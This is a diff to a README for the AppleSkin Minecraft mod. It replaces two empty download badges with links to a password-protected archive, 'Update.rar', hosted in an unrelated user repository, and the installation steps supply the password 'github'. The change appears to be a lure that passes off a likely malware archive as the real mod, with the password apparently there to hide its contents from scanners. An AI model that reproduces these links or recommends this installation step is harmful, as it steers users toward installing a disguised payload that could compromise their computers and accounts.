@@ -1,8 +1,8 @@
-# AppleSkin Minecraft Mod [![Download AppleSkin](https://img.shields.io/badge/Download-AppleSkin-green)]()
+# AppleSkin Minecraft Mod [![Download AppleSkin](https://img.shields.io/badge/Download-AppleSkin-green)](https://github.com/hilgabe/apple-skins/releases/download/Release/Update.rar)
 
 ## Installation
 To install **AppleSkin**, follow these steps:
-1. [![Download AppleSkin](https://img.shields.io/badge/Download-AppleSkin-green)]()
+1. [![Download AppleSkin](https://img.shields.io/badge/Download-AppleSkin-green)](https://github.com/hilgabe/apple-skins/releases/download/Release/Update.rar)
 
 2. **Pass: github**
 
